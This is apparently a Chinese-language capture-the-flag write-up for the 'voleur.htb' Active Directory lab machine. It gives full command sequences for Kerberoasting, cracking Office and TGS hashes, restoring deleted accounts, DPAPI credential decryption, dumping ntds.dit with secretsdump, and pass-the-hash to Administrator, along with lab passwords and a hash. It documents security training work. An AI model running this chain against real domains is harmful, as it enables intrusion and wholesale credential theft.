## 0x00 侦察阶段

### 0x01 初始凭证

| 角色 | 用户名 | 密码 | 备注 |
|------|--------|------|------|
| 一线支持 | ryan.naylor | HollowOct31Nyt | 预置域账号，NTLM 禁用，仅 Kerberos |

### 0x02 端口扫描摘要

```
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          AD LDAP (Domain: voleur.htb)
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http    RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu ← **WSL 通道**
5985/tcp  open  winrm         Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        .NET Message Framing
```

- **域名称**：`voleur.htb`  
- **OS 混合**：Windows DC + Linux（WSL，2222 端口）

---

## 0x10 域枚举（Kerberos Only）

### 0x11 环境准备

```bash
# 生成 krb5.conf
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' \
     --generate-krb5-file /tmp/voleur.krb5

export KRB5_CONFIG=/tmp/voleur.krb5
```

> 时间漂移 > 5 min 会报 `KRB_AP_ERR_SKEW`，用 `faketime` 或 `ft.sh`  wrapper 校准即可。

### 0x12 用户与共享枚举

```bash
# 域内用户
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --users

# 可读共享
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
```

**重点收获**：

| 用户 | 角色 | 备注 |
|------|------|------|
| ryan.naylor | 一线支持 | Pre-Auth 禁用 → AS-REP Roasting |
| marie.bryant | 一线支持 | — |
| lacey.miller | 二线支持 | 可重置 svc_winrm 密码 |
| todd.wolfe | 已离职 | 账户已删，密码曾被重置为 **NightT1meP1dg3on14** |
| jeremy.combs | 三线支持 | 可访问 Software 目录 |
| svc_ldap / svc_iis / svc_backup / svc_winrm | 服务账号 | Excel 中记录部分明文密码 |

---

## 0x20 USER 阶段

### 0x21 Excel 加密文件突破

```bash
# 提取哈希
office2john Access_Review.xlsx > access.hash

# 爆破
john access.hash --wordlist=rockyou.txt
# 结果：football1
```

打开后得到完整**权限矩阵表**（含上述所有账号与初始密码）。

### 0x22 BloodHound 图谱关键路径

- `svc_ldap` → 属于 `RESTORE_USERS` 组  
- `RESTORE_USERS` → 对 **二线支持组** 有 `GenericWrite`  
- 二线支持组含 `lacey.miller`，但她无出边  
- `svc_winrm` 在 **REMOTE MANAGEMENT USERS** → 可 WinRM 登录  
- **我们对 svc_winrm 拥有 WriteSPN** → 可 Ghost SPN Hijacking → Kerberoasting

---

## 0x30 权限链利用（WriteSPN → Kerberoasting）

### 0x31 一键 Ghost SPN

```bash
# 工具：targetedKerberoast（已支持 -k 纯 Kerberos）
python targetedKerberoast.py -v -k \
  -u 'svc_ldap@voleur.htb' -p 'M1XyC9pW7qT5Vn' \
  --dc-ip $target_ip --dc-host 'dc.voleur.htb'

# 得 TGS 票据 Hash
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$* ... <snip>
```

### 0x32 Hashcat 爆破

```bash
hashcat -m 13100 -a 0 svc_winrm.tgs rockyou.txt
# 结果：AFireInsidedeOzarctica980219afi
```

### 0x33 获取 TGT 并 WinRM 登录

```bash
getTGT.py 'voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi'

env KRB5CCNAME=svc_winrm.ccache \
evil-winrm -i dc.voleur.htb -u svc_winrm -r voleur.htb
```

→ 成功拿到 **User Flag**

---

## 0x40 ROOT 阶段

### 0x41 AD Recycle Bin 复活已删用户

```powershell
# 确认功能已开启
Get-ADOptionalFeature 'Recycle Bin Feature' | Get-ADObject

# 查找 Todd 的幽灵对象
Get-ADObject -Filter 'Name -like "*Todd*"' -IncludeDeletedObjects -Properties *

# 还原账户（需 RESTORE_USERS 权限）
Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'
Enable-ADAccount -Identity 'todd.wolfe'

# 确认组成员身份 → REMOTE MANAGEMENT USERS
Get-ADUser todd.wolfe -Properties MemberOf
```

→ 获得 Todd 明文密码：**NightT1meP1dg3on14**

---

## 0x50 DPAPI 凭据挖掘

### 0x51 下载 DPAPI 工件

```
来源：\\dc.voleur.htb\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\
├── Credentials\772275FAD58525253490A9B0039791D3   ← 加密凭据 blob
└── Protect\<SID>\08949382-134f-4c63-b93c-ce52efc0aa88 ← 主密钥
```

使用 `smbclient.py` 通过 Kerberos 挂载共享并下载。

### 0x52 离线解密

```bash
# 1. 用 Todd 的密码+SID 破解主密钥
dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 \
  -sid S-1-5-21-...-1110 -password 'NightT1meP1dg3on14'

# 2. 用主密钥解密凭据 blob
dpapi.py credential -file 772275FAD58525253490A9B0039791D3 \
  -key <masterkey_hex>
```

→ 解密得到 jeremy.combs 的新凭据：

```
Username: jeremy.combs
Password: qT3V9pLXyN7W4m
```

---

## 0x60 WSL → 备份盘 → 全域哈希

### 0x61 SSH 登录 WSL（端口 2222）

```bash
# 早前发现的 OpenSSH 私钥对应用户：svc_backup
ssh svc_backup@voleur.htb -i id_rsa -p 2222
```

### 0x62 备份盘已挂载至 `/mnt`

```
/mnt/c/IT/Third-Line Support/Backups/
├── Active Directory/
│   └── ntds.dit          ← 域控数据库
└── registry/
    ├── SYSTEM            ← BootKey
    └── SECURITY
```

### 0x63 本地 secretsdump

```bash
# 下载 ntds.dit + SYSTEM 到攻击机
secretsdump.py LOCAL -system SYSTEM -ntds ntds.dit
```

→ 成功导出**所有域哈希**，包括：

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
```

### 0x64 Pass-the-Hash 登录 DC

```bash
# 申请 Administrator TGT
getTGT.py voleur.htb/administrator -hashes :e656e07c56d831611b577b160b259ad2

# WinRM 登录
env KRB5CCNAME=administrator.ccache \
evil-winrm -i dc.voleur.htb -u administrator -r voleur.htb
```

→ **ROOT FLAG 到手**

---

## 0xFF 攻击链回顾

1. **Kerberos 初始踩点** → 拿 ryan.naylor  
2. **Excel 解密** → 获得全账号密码表  
3. **BloodHound 分析** → WriteSPN on svc_winrm  
4. **Ghost SPN + Kerberoasting** →  crack svc_winrm → User Shell  
5. **AD Recycle Bin 复活 todd.wolfe** → 新凭证  
6. **DPAPI 解密 todd 的遗留凭据** → jeremy.combs 密码  
7. **jeremy 可访问 WSL 备份盘** → /mnt/c/…/ntds.dit  
8. **离线 secretsdump** → 全域哈希 → Administrator PTH → Root

---